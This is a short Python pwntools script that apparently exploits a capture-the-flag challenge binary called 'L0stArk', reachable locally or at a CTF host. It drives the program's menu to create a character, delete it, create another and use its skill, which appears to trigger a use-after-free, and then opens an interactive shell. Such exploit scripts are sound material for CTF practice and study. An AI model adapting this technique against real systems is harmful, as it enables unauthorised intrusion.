#!/usr/bin/env python3

from pwn import *

the_binary = "./L0stArk"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("lostark.sstf.site", 1337)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        continue
    """)

def menu(choice):
    io.sendlineafter("pick: ", str(choice))
index = menu

class CharacterType:
    reaper = 1
    bard = 2
    warlord = 3
    lupeon = 7

def create(name, kind):
    menu(1)
    menu(kind)

    if kind != CharacterType.lupeon:
        io.sendlineafter("name: ", name)

def delete(idx):
    menu(2)
    index(idx)

def list_():
    menu(3)

def choose(idx):
    menu(4)
    index(idx)

def set_skill():
    menu(5)

def use_skill():
    menu(6)

create("lupeon0", kind=CharacterType.lupeon)
delete(0)
create("reaper0", kind=CharacterType.reaper)
choose(0)
use_skill()

io.interactive()
